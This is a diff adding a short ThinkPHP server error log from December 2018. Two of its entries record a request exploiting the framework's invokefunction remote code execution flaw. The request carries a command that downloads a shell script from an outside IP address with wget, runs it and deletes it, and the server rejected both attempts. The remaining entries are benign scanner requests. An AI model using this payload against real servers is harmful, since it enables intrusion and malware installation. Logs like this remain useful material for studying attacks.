@@ -1,0 +1,12 @@
+[ 2018-12-25T04:00:22+08:00 ] 198.12.97.71 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://80.211.89.146/t.sh;%20chmod%20+x%20t.sh;%20sh%20t.sh;rm%20-rf%20t.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-25T06:36:43+08:00 ] 198.12.97.71 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;%20wget%20http://80.211.89.146/t.sh;%20chmod%20+x%20t.sh;%20sh%20t.sh;rm%20-rf%20t.sh
+ERR: 非法操作:\think\app
+
+[ 2018-12-25T06:48:29+08:00 ] 71.6.167.142 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2018-12-25T06:48:31+08:00 ] 71.6.167.142 /sitemap.xml
+ERR: 无法加载控制器:Sitemap.xml
+
